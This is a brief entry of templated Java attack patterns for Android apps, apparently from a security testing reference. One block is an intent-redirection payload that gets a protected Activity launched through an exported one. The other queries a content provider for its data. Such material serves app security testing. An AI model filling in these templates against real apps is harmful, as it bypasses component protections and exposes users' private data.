payloads_or_patterns:
Intent payload for triggering a protected Activity: 
```java
Intent protectedIntent = new Intent();
protectedIntent.setClassName("<target_package_name>", ".<ProtectedComponentName>");
protectedIntent.putExtra("<param_name>", "<value>");

Intent exploitIntent = new Intent();
exploitIntent.setClassName("<target_package_name>", ".<ExportedTriggerActivity>");
exploitIntent.putExtra("secure_extra", protectedIntent); // Use the actual extra key from the vulnerable app
startActivity(exploitIntent);
```

Content Provider access pattern:
```java
Uri contentUri = Uri.parse("content://<provider_authority>/<data_path>");
Cursor cursor = getContentResolver().query(contentUri, null, null, null, null);
// Process cursor data
```
